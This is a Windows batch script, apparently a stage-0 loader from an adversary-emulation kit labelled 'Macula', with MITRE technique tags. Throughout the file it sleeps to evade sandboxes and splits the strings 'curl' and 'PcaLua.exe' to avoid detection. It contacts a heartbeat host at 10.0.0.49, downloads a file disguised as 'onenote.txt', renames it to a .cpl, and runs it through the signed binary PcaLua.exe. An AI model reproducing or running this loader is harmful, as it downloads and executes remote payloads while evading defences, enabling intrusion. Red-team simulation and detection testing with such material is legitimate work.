@echo off
SETLOCAL EnableDelayedExpansion

REM --- PHR Variables (plain literals - do not obfuscate) ---
SET ambnnpe=%APPDATA%\7971\23931c82
SET kqmjyg=Macula-Stage0-7971
SET ulqmwy=https://10.0.0.49
SET ghsxrk=https://10.0.0.49/stage/2/icon.png?7971-7
SET lqsijy=BALAM-S2BO
SET fxtjpb=7
SET tzpvau=onenote.txt
SET jyevf=7971

REM --- Obfuscated System Paths ---
SET part1=C:\Windo
SET part2=ws\System3
SET part3=2\
SET syspath=%part1%%part2%%part3%

REM --- Obfuscated LOLBIN Components ---
SET bin1=Pca
SET bin2=lua.ex
SET bin3=e
SET pcafull=%bin1%%bin2%%bin3%
SET lolref=pcafull

REM --- Obfuscated Curl Components ---
SET cmd1=cu
SET cmd2=rl
SET curlref=%cmd1%%cmd2%

REM --- Log File Setup ---
SET logbase=%APPDATA%\%fxtjpb%
SET logfile=%logbase%\macula-simulations.log

REM --- Create Directory ---
IF NOT EXIST "%logbase%" mkdir "%logbase%" >nul 2>&1

REM --- Debug Log: Script Start ---
echo [!DATE! !TIME!][DEBUG][!lqsijy!]: script_start=heartbeat_check>> "%logfile%" 2>nul

REM --- Initial Anti-Sandbox Delay (60s) ---
timeout /t 60 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!lqsijy!]: delay_complete=60s>> "%logfile%" 2>nul

REM --- Heartbeat Check ---
REM [TTP T1218] Signed Binary Proxy Execution: Curl for heartbeat
SET beaturl=!ghsxrk!
SET result=0
SET err=

echo [!DATE! !TIME!][DEBUG][!lqsijy!]: heartbeat_start=!beaturl!>> "%logfile%" 2>nul
!curlref! -k -s -o nul "!beaturl!"
IF !ERRORLEVEL! EQU 0 (
    SET result=1
    echo [!DATE! !TIME!][DEBUG][!lqsijy!]: heartbeat_success=200>> "%logfile%" 2>nul
) ELSE (
    SET result=0
    SET err=connection_failed
    echo [!DATE! !TIME!][DEBUG][!lqsijy!]: heartbeat_failed=!ERRORLEVEL!>> "%logfile%" 2>nul
)

REM --- TTP Log: Heartbeat ---
FOR /F "tokens=2 delims==" %%I IN ('wmic os get localdatetime /value') DO SET datetime=%%I
SET ttp_ts=!datetime:~0,4!-!datetime:~4,2!-!datetime:~6,2! !datetime:~8,2!:!datetime:~10,2!:!datetime:~12,2!.!datetime:~15,3!
(echo [!ttp_ts!][!lqsijy!]: !fxtjpb!-!jyevf!-T1105|Ingress Tool Transfer=!result!:!err!>> "!logfile!") 2>nul

REM --- Delay Between Operations ---
ping -n 12 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!lqsijy!]: delay_complete=12s_ping>> "%logfile%" 2>nul

REM --- Ensure Output Directory Exists ---
IF NOT EXIST "!ambnnpe!" mkdir "!ambnnpe!" >nul 2>&1
echo [!DATE! !TIME!][DEBUG][!lqsijy!]: directory_created=!ambnnpe!>> "%logfile%" 2>nul

REM --- Build Download URL ---
SET url1=!ulqmwy!
SET url2=/download/
SET url3=!tzpvau!
SET fullurl=!url1!!url2!!url3!

REM --- Obfuscated Download Command ---
SET arg1=-k
SET arg2=-s
SET arg3=-o
SET outpath=!ambnnpe!\!tzpvau!
CALL SET outpath=%%outpath%%
SET dlcmd=!curlref! !arg1! !arg2! !arg3! "!outpath!" "!fullurl!"

echo [!DATE! !TIME!][DEBUG][!lqsijy!]: download_start=!fullurl!>> "%logfile%" 2>nul
%dlcmd%
IF !ERRORLEVEL! NEQ 0 (
    echo [!DATE! !TIME!][DEBUG][!lqsijy!]: download_failed=!ERRORLEVEL!>> "%logfile%" 2>nul
    EXIT /B 1
)
echo [!DATE! !TIME!][DEBUG][!lqsijy!]: download_complete=!outpath!>> "%logfile%" 2>nul

REM --- Random Delay (10-30s) ---
SET /A rdelay=%RANDOM% %% 20 + 10
timeout /t %rdelay% /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!lqsijy!]: delay_random=!rdelay!s>> "%logfile%" 2>nul

REM --- Rename to CPL ---
SET oldfile=!ambnnpe!\!tzpvau!
SET newfile=!ambnnpe!\pcafile.cpl
echo [!DATE! !TIME!][DEBUG][!lqsijy!]: rename_start=!oldfile!>> "%logfile%" 2>nul
MOVE /Y "!oldfile!" "!newfile!" >nul 2>&1
IF !ERRORLEVEL! NEQ 0 (
    echo [!DATE! !TIME!][DEBUG][!lqsijy!]: rename_failed=!ERRORLEVEL!>> "%logfile%" 2>nul
    EXIT /B 1
)
echo [!DATE! !TIME!][DEBUG][!lqsijy!]: rename_complete=!newfile!>> "%logfile%" 2>nul

REM --- Delay Before Execution ---
CHOICE /C Y /N /D Y /T 8 >nul
echo [!DATE! !TIME!][DEBUG][!lqsijy!]: delay_complete=8s_choice>> "%logfile%" 2>nul

REM --- Obfuscated Execution Command ---
SET execpath=!syspath!!pcafull!
SET execarg1=-a
SET execarg2=!newfile!
SET runcmd=!execpath! !execarg1! "!execarg2!"

REM --- TTP Log: DLL Execution (T1218) ---
SET result=1
SET err=
echo [!DATE! !TIME!][DEBUG][!lqsijy!]: execution_start=!execpath!>> "%logfile%" 2>nul
%runcmd%
IF !ERRORLEVEL! NEQ 0 (
    SET result=0
    SET err=execution_failed_!ERRORLEVEL!
    echo [!DATE! !TIME!][DEBUG][!lqsijy!]: execution_failed=!ERRORLEVEL!>> "%logfile%" 2>nul
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!lqsijy!]: execution_success=!execarg2!>> "%logfile%" 2>nul
)

REM --- Final TTP Log ---
FOR /F "tokens=2 delims==" %%I IN ('wmic os get localdatetime /value') DO SET datetime=%%I
SET ttp_ts=!datetime:~0,4!-!datetime:~4,2!-!datetime:~6,2! !datetime:~8,2!:!datetime:~10,2!:!datetime:~12,2!.!datetime:~15,3!
(echo [!ttp_ts!][!lqsijy!]: !fxtjpb!-!jyevf!-T1218|Signed Binary Proxy Execution=!result!:!err!>> "!logfile!") 2>nul

REM --- Final Delay and Exit ---
timeout /t 15 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!lqsijy!]: script_complete=exit>> "%logfile%" 2>nul
ENDLOCAL